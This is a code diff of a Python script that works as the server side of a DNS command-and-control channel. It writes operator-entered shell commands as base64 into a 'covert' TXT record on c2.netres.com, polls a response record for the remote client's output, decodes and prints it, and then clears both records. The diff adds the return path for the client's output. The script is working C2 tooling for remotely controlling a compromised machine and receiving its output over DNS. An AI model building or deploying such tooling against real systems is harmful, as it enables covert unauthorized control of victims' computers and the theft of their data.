@@ -1,47 +1,69 @@
 import dns.update
 import dns.query
+import dns.resolver
 import time
 import base64
 
-# sleep time in seconds
-SLEEP_TIME = 10
+# sleep time between checking response record
+SLEEP_TIME = 1
+
+# time to wait for response from the client
+TIMEOUT = 30
 
 # pre-decided zone and record names
 ZONE = 'c2.netres.com.'
-RECORD = 'message.c2.netres.com.'
+COMMAND_RECORD = 'command.c2.netres.com.'
+RESPONSE_RECORD = 'response.c2.netres.com.'
 
 # must provide the IP address of the DNS server
 DNS_IP = '192.168.243.141'
 
-
 # update the covert record with the next command we want the client to run
-def update_record(new_msg: str) -> str:
+def update_record(record: str, msg: str) -> str:
+    if msg != '':
+        encoded_msg = base64.b64encode(msg.encode()).decode()
+    else:
+        encoded_msg = msg
+
     update = dns.update.Update(ZONE)
-    update.delete(RECORD, 'TXT')
-    update.add(RECORD, 60, 'TXT', new_msg)
+    update.delete(record, 'TXT')
+    update.add(record, 60, 'TXT', encoded_msg)
 
     response = dns.query.tcp(update, DNS_IP)
     return response
 
 
 def main():
+    resolver = dns.resolver.Resolver()
+    resolver.nameservers = [DNS_IP]
+
     while True:
         command = input('Enter a command: ')
-        b64_command = base64.b64encode(command.encode()).decode()
-        response = update_record(b64_command)
+        response = update_record(COMMAND_RECORD, command)
 
         if "SERVFAIL" in str(response):
             print('Something went wrong :(')
             continue
 
-        print('Command set. Waiting...')
-        time.sleep(SLEEP_TIME)
-
-        # reset the field to be empty
-        # in the future, when the client can pass command output back to the server,
-        # we can wait to receive that response and then reset the record
-        print('Resetting covert text record...\n')
-        update_record('""')
+        print('Command set. Waiting for response...')
+        start_time = time.time()
+        while time.time() - start_time < TIMEOUT:
+            time.sleep(SLEEP_TIME)
+            client_response = resolver.resolve(RESPONSE_RECORD, 'TXT')
+            full_client_text = ''
+            for response in client_response:
+                text_response = response.to_text().strip('"')
+                full_client_text += text_response
+            decoded_response = base64.b64decode(full_client_text).decode()
+            
+            if decoded_response != '""':  # client returned a response
+                # reset the field to be empty
+                print(decoded_response, '\n')
+                update_record(RESPONSE_RECORD, '""')
+                update_record(COMMAND_RECORD, '""')
+                break
+        else:  #  timeout received
+            print('Response timed out from client\n')
 
 
 if __name__ == '__main__':
